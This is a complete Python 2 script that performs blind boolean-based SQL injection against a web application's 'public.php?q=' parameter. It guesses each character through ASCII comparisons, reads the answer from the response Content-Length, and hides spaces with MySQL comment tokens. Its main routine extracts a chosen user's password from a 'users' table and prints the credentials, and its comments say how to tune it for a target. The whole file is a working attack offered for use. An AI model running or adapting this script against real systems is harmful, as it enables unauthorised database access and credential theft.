import sys
import requests

def vulnerablefunction_sqli(ip, inj_str):
    for j in range (32, 126):
        target = "http://%s/application/path/public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        # you need to find the correct response content length for your environment for a True response and update the below. 
        if (content_length > 254):
            return j
    return None

def inject(r, inj, ip):
    extracted = ""
    for i in range(1,r):
        # /**/ substitutes for space in MySQL if filtered by application
        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (inj,i)
        retrieved_value = vulnerablefunction_sqli(ip, injection_string)
        if(retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            print "\n(+) done!"
            break
    return extracted


def main():
    if len(sys.argv) != 3:
        print "(+) usage: %s <target> <username> " % sys.argv[0]
        print '(+) eg: %s 10.10.10.1 <frank> ' % sys.argv[0]
        sys.exit(-1)
    
    ip = sys.argv[1]
    username = sys.argv[2]

    print "(+) Retrieving password"
    # adjust the SQL query based on your database structure and what you want to extract from the DB 
    query = 'select/**/password/**/from/**/users/**/where/**/login/**/=/**/\'%s\'' % (username)
    password = inject(50, query, ip)
    print "(+) Credentials: %s / %s" % (username, password)

if __name__ == "__main__":
    main()
